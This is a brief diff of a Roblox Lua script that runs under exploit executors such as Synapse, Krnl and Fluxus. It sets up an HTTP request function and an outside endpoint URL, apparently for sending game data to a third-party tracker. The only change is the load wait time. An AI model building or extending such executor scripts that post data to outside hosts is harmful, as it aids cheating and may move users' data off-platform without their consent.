@@ -1,5 +1,5 @@
 task.spawn(function()
-repeat task.wait() until game:IsLoaded()
+repeat task.wait(15) until game:IsLoaded()
 local requests = (syn and syn.request) or (krnl and request) or (fluxus and fluxus.request) or (electron and http.request) or request or http.request
 local HttpService = game:GetService("HttpService")
 local url = "https://bloxtracker.xyz/api/saveCos.php"
